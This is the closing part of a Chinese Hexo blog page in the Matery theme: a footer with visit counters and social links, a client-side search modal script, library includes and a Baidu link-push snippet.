            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
